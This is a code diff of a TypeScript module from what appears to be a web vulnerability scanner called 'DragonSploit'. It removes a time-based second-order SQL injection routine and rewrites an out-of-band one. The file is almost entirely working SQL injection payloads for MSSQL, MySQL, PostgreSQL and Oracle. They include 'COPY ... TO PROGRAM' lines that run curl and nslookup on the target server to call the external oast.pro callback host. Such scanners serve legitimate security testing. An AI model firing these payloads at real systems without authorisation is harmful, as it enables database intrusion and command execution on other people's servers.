@@ -1,288 +1,174 @@
-// file: vector-attacks.ts
 import { Job } from 'bullmq';
 import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
-import axios from 'axios';
-import { executeRequest, delay, recordVulnerability, COMMON_FALLBACK_PARAMS } from './common';
 import { URL } from 'url';
 import { v4 as uuidv4 } from 'uuid';
 import * as crypto from 'crypto';
+import axios from 'axios';
+import { executeRequest, delay, recordVulnerability, COMMON_FALLBACK_PARAMS } from './common';
 
-/**
- * Second-Order (time-based) attack vector
- */
-export async function executeSecondOrderAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
-  const { targetUrl, scanId } = job.data;
-  console.log('[Vector 4] Starting Second-Order Attack...');
-  let found = false;
+// ============================================================================
+// ⚙️ CONFIGURATION
+// ============================================================================
 
-  const TIME_DELAY_THRESHOLD = 4000; // ms
+const INTERACTSH_SERVER = 'oast.pro';
+const POLL_DELAY_MS = 5000; // تقليل وقت الانتظار قليلاً لأننا سنستخدم التوازي
+const MAX_POLL_RETRIES = 2;
 
-  const attackVectors = [
-    {
-      name: "Username to Profile Page",
-      injectionPoint: { path: "/api/register", method: "POST", payloadField: "username" },
-      triggerPoint: { path: "/api/profile/{userId}", method: "GET" }
-    },
-    {
-      name: "Product Review to Product Page",
-      injectionPoint: { path: "/api/products/{productId}/reviews", method: "POST", payloadField: "comment" },
-      triggerPoint: { path: "/api/products/{productId}", method: "GET" }
-    },
-    {
-      name: "User Bio to Profile Page",
-      injectionPoint: { path: "/api/profile/update", method: "POST", payloadField: "bio" },
-      triggerPoint: { path: "/api/profile/{userId}", method: "GET" }
-    }
-  ];
-
-  const timeBombPayloads = {
-    MySQL: (field: string) => `${field}_value'; WAITFOR DELAY '0:0:5' --`,
-    PostgreSQL: (field: string) => `${field}_value'; SELECT pg_sleep(5); --`,
-    SQLite: (field: string) => {
-      const unionSelect = Array(1000).fill(0).map((_, i) => `SELECT ${i + 1}`).join(' UNION ALL ');
-      return `${field}_value' AND (SELECT COUNT(*) FROM (${unionSelect})) > 0 --`;
-    }
-  };
-
-  for (const vector of attackVectors) {
-    console.log(`[Vector 4] Testing Vector: ${vector.name}`);
-
-    for (const [dbType, payloadFn] of Object.entries(timeBombPayloads)) {
-      console.log(`[Vector 4] Testing Database Type: ${dbType}`);
-
-      // Build injection path BEFORE creating URL (avoid reassigning const)
-      let injectionPath = vector.injectionPoint.path;
-      let productId: string | null = null;
-      if (injectionPath.includes("{productId}")) {
-        productId = "1"; // adjust logic to pick real product when available
-        injectionPath = injectionPath.replace("{productId}", productId);
-      }
-
-      const injectionUrl = new URL(injectionPath, targetUrl).toString();
-      const payloadValue = (payloadFn as (f: string) => string)(vector.injectionPoint.payloadField);
-      const injectionPayload = { [vector.injectionPoint.payloadField]: payloadValue };
-
-      let userId: string | null = null;
-      try {
-        // If registration insertion required, register clean first
-        if (vector.injectionPoint.path.includes("/api/register")) {
-          const cleanPayload = {
-            [vector.injectionPoint.payloadField]: `clean_${Math.random().toString(36).substring(2, 8)}`,
-            password: "test123"
-          };
-          const cleanResponse = await axios.post(injectionUrl, cleanPayload, { headers: { 'User-Agent': 'DragonSploit/2.0' } });
-          if (cleanResponse.status !== 200 && cleanResponse.status !== 201) {
-            console.log(`[Vector 4] Clean registration failed for ${vector.name}`);
-            continue;
-          }
-          userId = (cleanResponse.data && cleanResponse.data.userId) ? String(cleanResponse.data.userId) : "1";
-        }
-
-        // Inject the malicious payload
-        const injectionResponse = await axios.post(injectionUrl, injectionPayload, { headers: { 'User-Agent': 'DragonSploit/2.0' } });
-        if (injectionResponse.status !== 200 && injectionResponse.status !== 201) {
-          console.log(`[Vector 4] Injection failed for ${vector.name}, DB: ${dbType}`);
-          continue;
-        }
-        console.log(`[Vector 4] Injected payload for ${vector.name}, DB: ${dbType}`);
-
-        // Ensure commit/visibility
-        await delay(1000);
-
-        // Build trigger URL (replace placeholders before constructing URL)
-        let triggerPath = vector.triggerPoint.path;
-        if (triggerPath.includes("{userId}")) {
-          if (!userId) {
-            console.log(`[Vector 4] No userId available for ${vector.name}`);
-            continue;
-          }
-          triggerPath = triggerPath.replace("{userId}", userId);
-        }
-        if (triggerPath.includes("{productId}")) {
-          if (!productId) {
-            console.log(`[Vector 4] No productId available for ${vector.name}`);
-            continue;
-          }
-          triggerPath = triggerPath.replace("{productId}", productId);
-        }
-
-        const triggerUrl = new URL(triggerPath, targetUrl).toString();
-
-        // Baseline measurement (clean)
-        const cleanTriggerPath = vector.triggerPoint.path
-          .replace("{userId}", userId || "1")
-          .replace("{productId}", productId || "1");
-        const cleanTriggerUrl = new URL(cleanTriggerPath, targetUrl).toString();
-        const baselineStart = Date.now();
-        await executeRequest(cleanTriggerUrl);
-        const baselineTime = Date.now() - baselineStart;
-        console.log(`[Vector 4] Baseline response time for ${vector.name}: ${baselineTime}ms`);
-
-        // Trigger the tainted data
-        const triggerStart = Date.now();
-        await executeRequest(triggerUrl);
-        const triggerTime = Date.now() - triggerStart;
-        console.log(`[Vector 4] Trigger response time for ${vector.name}: ${triggerTime}ms`);
-
-        if (triggerTime > baselineTime + TIME_DELAY_THRESHOLD) {
-          console.log(`[Vector 4] Second-Order SQLi Confirmed for ${vector.name}, DB: ${dbType}`);
-          const proof = `Payload: ${payloadValue}\nInjection Path: ${injectionUrl}\nTrigger Path: ${triggerUrl}\nBaseline Time: ${baselineTime}ms\nDelayed Time: ${triggerTime}ms`;
-          const description = `Second-Order SQLi confirmed via the '${vector.name}' vector. A payload stored in the '${vector.injectionPoint.payloadField}' field at '${injectionUrl}' was triggered when accessing '${triggerUrl}', causing a measurable execution delay.`;
-          await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
-          found = true;
-          break;
-        }
-      } catch (err: unknown) {
-        // safe error handling (axios or generic)
-        if (axios.isAxiosError(err)) {
-          console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${err.message}`);
-        } else if (err instanceof Error) {
-          console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${err.message}`);
-        } else {
-          console.log(`[Vector 4] Error during ${vector.name}, DB: ${dbType}: ${String(err)}`);
-        }
-      }
-    }
-
-    if (found) break;
-  }
-
-  return found;
+interface OobPayload {
+    name: string;
+    template: string;
 }
 
-/**
- * Out-of-band (OOB) interaction attack vector
- */
+const OOB_PAYLOADS: OobPayload[] = [
+    { name: "MSSQL_DNS", template: `; EXEC master..xp_dirtree '\\\\{DOMAIN}\\a';--` },
+    { name: "MySQL_DNS_Win", template: ` AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.{DOMAIN}\\\\a')))` },
+    { name: "PostgreSQL_HTTP", template: `'; COPY (SELECT '') TO PROGRAM 'curl http://{DOMAIN}';--` },
+    { name: "PostgreSQL_DNS", template: `'; COPY (SELECT '' ) TO PROGRAM 'nslookup {DOMAIN}';--` },
+    { name: "Oracle_HTTP", template: `'||UTL_HTTP.REQUEST('http://{DOMAIN}' )||'` },
+    { name: "Oracle_DNS", template: `'||UTL_INADDR.GET_HOST_ADDRESS('{DOMAIN}')||'` },
+];
+
+// ============================================================================
+// 🛡️ MAIN ATTACK LOGIC
+// ============================================================================
+
 export async function executeOutOfBandAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
-  const { targetUrl, scanId } = job.data;
-  console.log('[Vector 3] Starting Out-of-Band Attack...');
-  let found = false;
+    const { targetUrl, scanId } = job.data;
+    console.log('[Vector 3] 📡 Starting Out-of-Band (OOB) Attack...');
+    
+    let foundVulnerability = false;
 
-  const interactshServer = 'oast.pro';
+    // 1. إعداد جلسة OAST واحدة لكل بارامتر (أو حتى للفحص كله لتقليل الضغط)
+    // هنا سننشئ جلسة واحدة لكل بارامتر لسهولة التتبع
+    for (const param of COMMON_FALLBACK_PARAMS) {
+        console.log(`\n[Vector 3] 🎯 Testing Parameter: [${param}]`);
 
-  const oobPayloads: { [key: string]: string } = {
-    MSSQL_DNS: `; EXEC master..xp_dirtree '\\\\${'{uniqueDomain}'}\\a';--`,
-    MySQL_DNS_Windows: ` AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.${'{uniqueDomain}'}\\\\a')))`,
-    PostgreSQL_HTTP: `'; COPY (SELECT '') TO PROGRAM 'curl http://${'{uniqueDomain}'}';--`,
-    PostgreSQL_DNS: `'; COPY (SELECT '' ) TO PROGRAM 'nslookup ${'{uniqueDomain}'}';--`,
-    Oracle_HTTP: `'||UTL_HTTP.REQUEST('http://${'{uniqueDomain}'}' )||'`,
-    Oracle_DNS: `'||UTL_INADDR.GET_HOST_ADDRESS('${'{uniqueDomain}'}')||'`,
-  };
+        try {
+            // 2. تسجيل نطاق فريد (Unique Interaction Domain)
+            const oastSession = await registerOastSession();
+            if (!oastSession) {
+                console.warn(`[Vector 3] ⚠️ Failed to register OAST session. Skipping param '${param}'.`);
+                continue;
+            }
 
-  for (const param of COMMON_FALLBACK_PARAMS) {
-    console.log(`[Vector 3] Testing Parameter: [${param}]`);
+            const { correlationId, secretKey, privateKey, uniqueDomain } = oastSession;
+            console.log(`[Vector 3] Registered OAST Domain: ${uniqueDomain}`);
 
-    for (const [payloadType, payloadTemplate] of Object.entries(oobPayloads)) {
-      // Generate RSA key pair
-      const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
-        modulusLength: 1024,
-        publicKeyEncoding: { type: 'pkcs1', format: 'pem' },
-        privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
-      });
+            // 3. إطلاق الحمولات بالتوازي (Fire & Forget)
+            // نرسل كل أنواع الحمولات معاً، لأننا سنفحص الـ Interactions لاحقاً
+            // كل حمولة ستحمل "بادئة" (Prefix) لتمييز نوع قاعدة البيانات
+            const attackPromises = OOB_PAYLOADS.map(async (payloadConfig) => {
+                // إضافة اسم البايلود للنطاق لتمييز الناجح منها
+                // مثال: mssql.correlationId.oast.pro
+                const taggedDomain = `${payloadConfig.name.substring(0, 5)}.${uniqueDomain}`;
+                const finalPayload = payloadConfig.template.replace('{DOMAIN}', taggedDomain);
+                
+                const testUrl = new URL(targetUrl);
+                testUrl.searchParams.set(param, finalPayload);
 
-      const encodedPublicKey = Buffer.from(publicKey).toString('base64');
+                // نرسل الطلب ولا ننتظر الرد (Fire and Forget) لأننا نهتم بـ DNS/HTTP Callback
+                return executeRequest(testUrl.toString()).catch(() => {}); 
+            });
 
-      // Correlation ID / secret
-      let uuid = uuidv4().replace(/-/g, '');
-      uuid = uuid.padEnd(33, 'a'); // pad to 33 chars
-      let guid = '';
-      for (const char of uuid) {
-        if (/[0-9]/.test(char)) {
-          guid += char;
-        } else {
-          const offset = Math.floor(Math.random() * 21);
-          guid += String.fromCharCode(char.charCodeAt(0) + offset);
+            await Promise.all(attackPromises); // ننتظر إرسال جميع الطلبات
+
+            // 4. الانتظار والتحقق (Poll for Interactions)
+            console.log(`[Vector 3] ⏳ Polling for interactions (${POLL_DELAY_MS}ms)...`);
+            await delay(POLL_DELAY_MS);
+
+            const interactions = await pollOastInteractions(correlationId, secretKey, privateKey);
+
+            if (interactions.length > 0) {
+                console.log(`[Vector 3] ✅ OOB Interaction Detected! Count: ${interactions.length}`);
+                
+                // تحليل أول تفاعل ناجح
+                const firstHit = interactions[0];
+                // نحاول استخراج اسم البايلود من النطاق (full_id)
+                const hitDomain = firstHit.full_id || firstHit.q_name || ""; 
+                const detectedType = OOB_PAYLOADS.find(p => hitDomain.includes(p.name.substring(0, 5)))?.name || "Unknown";
+
+                const proof = `Interaction Type: ${firstHit.protocol}\nPayload Type: ${detectedType}\nRemote IP: ${firstHit['remote-address']}\nFull Data: ${JSON.stringify(firstHit)}`;
+                const description = `Out-of-Band SQLi confirmed in '${param}'. Server initiated a connection to ${uniqueDomain}.`;
+                
+                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
+                foundVulnerability = true;
+                
+                // لا داعي لإكمال البارامترات الأخرى إذا وجدنا ثغرة (اختياري)
+                // break; 
+            }
+
+        } catch (error: any) {
+            console.error(`[Vector 3] Error processing param '${param}': ${error.message}`);
         }
-      }
-      const correlationId = guid.substring(0, 20);
-      const secret = uuidv4();
-      const uniqueDomain = `${guid}.${interactshServer}`;
+    }
 
-      // Register with interactsh server
-      let registered = false;
-      try {
-        const response = await axios.post(`https://${interactshServer}/register`, {
-          'public-key': encodedPublicKey,
-          'secret-key': secret,
-          'correlation-id': correlationId,
+    return foundVulnerability;
+}
+
+// ============================================================================
+// 🛠️ OAST HELPER FUNCTIONS (Interactsh Client)
+// ============================================================================
+
+async function registerOastSession() {
+    try {
+        const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
+            modulusLength: 2048,
+            publicKeyEncoding: { type: 'pkcs1', format: 'pem' },
+            privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
         });
-        if (response.data && response.data.message && response.data.message.includes('registration successful')) {
-          registered = true;
+        const encodedPublicKey = Buffer.from(publicKey).toString('base64');
+        const secretKey = uuidv4();
+        const correlationId = uuidv4().substring(0, 20); // Interactsh requires max 20 chars
+
+        const response = await axios.post(`https://${INTERACTSH_SERVER}/register`, {
+            'public-key': encodedPublicKey,
+            'secret-key': secretKey,
+            'correlation-id': correlationId,
+        }, { timeout: 5000 });
+
+        if (response.status === 200) {
+            return { 
+                correlationId, 
+                secretKey, 
+                privateKey, 
+                uniqueDomain: `${correlationId}.${INTERACTSH_SERVER}` 
+            };
         }
-      } catch (err: unknown) {
-        if (axios.isAxiosError(err)) {
-          console.log(`[Vector 3] Registration error for ${payloadType}: ${err.message}`);
-        } else if (err instanceof Error) {
-          console.log(`[Vector 3] Registration error for ${payloadType}: ${err.message}`);
-        } else {
-          console.log(`[Vector 3] Registration error for ${payloadType}: ${String(err)}`);
-        }
-        continue;
-      }
+    } catch (e) { /* ignore */ }
+    return null;
+}
 
-      if (!registered) continue;
+async function pollOastInteractions(correlationId: string, secretKey: string, privateKey: string): Promise<any[]> {
+    try {
+        const response = await axios.get(
+            `https://${INTERACTSH_SERVER}/poll?id=${correlationId}&secret=${secretKey}`, 
+            { timeout: 5000 }
+        );
+        
+        const { data, aes_key } = response.data;
+        if (!data || !aes_key || data.length === 0) return [];
 
-      // Craft OOB payload and inject
-      const oobPayload = payloadTemplate.replace('{uniqueDomain}', uniqueDomain);
-      const testUrl = new URL(targetUrl);
-      testUrl.searchParams.set(param, oobPayload);
-
-      try {
-        await executeRequest(testUrl.toString());
-      } catch {
-        // ignore network errors from triggering request
-      }
-
-      // wait and poll
-      await delay(8000);
-
-      try {
-        const pollResponse = await axios.get(`https://${interactshServer}/poll?id=${correlationId}&secret=${secret}`);
-        const pollData = pollResponse.data;
-
-        let interactions: any[] = [];
-        if (pollData && pollData.aes_key && pollData.data && pollData.data.length > 0) {
-          // decrypt AES key
-          const aesEncrypted = Buffer.from(pollData.aes_key, 'base64');
-          const aesPlainKey = crypto.privateDecrypt({
+        // Decrypt AES Key
+        const aesKeyBuffer = Buffer.from(aes_key, 'base64');
+        const decryptedAesKey = crypto.privateDecrypt({
             key: privateKey,
             padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
             oaepHash: 'sha256',
-          }, aesEncrypted);
+        }, aesKeyBuffer);
 
-          // decrypt data entries
-          for (const encryptedData of pollData.data) {
-            const decode = Buffer.from(encryptedData, 'base64');
-            const iv = decode.slice(0, 16);
-            const decipher = crypto.createDecipheriv('aes-256-cfb', aesPlainKey, iv);
-            let plainBuffer = decipher.update(decode);
-            plainBuffer = Buffer.concat([plainBuffer, decipher.final()]);
-            const plainText = plainBuffer.slice(16).toString('utf8');
-            interactions.push(JSON.parse(plainText));
-          }
-        }
+        // Decrypt Interactions
+        return data.map((entry: string) => {
+            try {
+                const encryptedBuffer = Buffer.from(entry, 'base64');
+                const iv = encryptedBuffer.slice(0, 16);
+                const content = encryptedBuffer.slice(16);
+                
+                const decipher = crypto.createDecipheriv('aes-256-cfb', decryptedAesKey, iv);
+                const decrypted = Buffer.concat([decipher.update(content), decipher.final()]);
+                
+                return JSON.parse(decrypted.toString());
+            } catch { return null; }
+        }).filter((i: any) => i !== null);
 
-        if (interactions.length > 0) {
-          console.log(`[Vector 3] OOB Interaction Detected for ${payloadType}.`);
-          const proof = `Payload Type: ${payloadType}\nUnique Domain: ${uniqueDomain}\nInteraction Data: ${JSON.stringify(interactions[0])}`;
-          const description = `Out-of-Band (OOB) SQLi confirmed in parameter '${param}'. The server was forced to perform a DNS/HTTP request to a controlled external domain.`;
-          await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
-          found = true;
-          break;
-        }
-      } catch (err: unknown) {
-        if (axios.isAxiosError(err)) {
-          console.log(`[Vector 3] Polling error for ${payloadType}: ${err.message}`);
-        } else if (err instanceof Error) {
-          console.log(`[Vector 3] Polling error for ${payloadType}: ${err.message}`);
-        } else {
-          console.log(`[Vector 3] Polling error for ${payloadType}: ${String(err)}`);
-        }
-      }
-    }
-
-    if (found) break;
-  }
-
-  return found;
+    } catch (e) { return []; }
 }
